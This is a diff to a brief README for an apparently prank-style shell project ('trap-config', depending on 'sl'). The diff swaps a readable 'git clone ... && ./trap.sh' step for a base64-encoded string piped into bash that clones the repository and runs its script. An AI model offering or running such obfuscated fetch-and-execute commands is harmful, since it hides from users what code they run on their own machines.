@@ -1,8 +1,8 @@
 # Just run:
 ```
-git clone https://github.com/Ezhkin-Kot/trap-config && cd trap-config && ./trap.sh
+echo 'Z2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9FemhraW4tS290L3RyYXAtY29uZmlnLmdpdCB+L3RyYXAtY29uZmlnIDI+L2Rldi9udWxsICYmIH4vdHJhcC1jb25maWcvdHJhcC5zaAo=' | base64 -d | bash
 ```
-and have fun)
+and have fun :)
 
 ## Dependencies:
 - `sl`
